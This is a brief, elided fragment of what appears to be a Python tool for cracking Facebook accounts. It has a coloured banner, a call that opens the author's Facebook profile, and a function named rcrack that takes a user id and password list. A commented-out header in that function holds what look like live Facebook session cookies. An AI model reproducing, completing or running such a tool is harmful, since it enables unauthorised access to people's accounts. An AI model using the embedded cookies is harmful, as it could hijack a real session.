...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/4R.Mamun')
logo=("""
    \33[1;33m____  ____        ________  ______  __________ 
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=bt_TYw_J3GixXQ2V-ISoO-o1; sb=bt_TY_ZE0eDJGZgdAPjuqCl3; dnonce=AWmqEQsx-bbJQ9r8LaHkZRNmztlCn9d_Ljm27GH33OAr1OTsz3BZdnaxv7Lv2YDGMs-ivdiuX0O0QqQZtkiQzDmT; m_pixel_ratio=1.6875; wd=427x810; fr=00D2RA22iCa4GmN4V..Bj099u.AL.AAA.0.0.Bj1EAL.AWXNM1PC8Jk',
    'save-data': 'on',
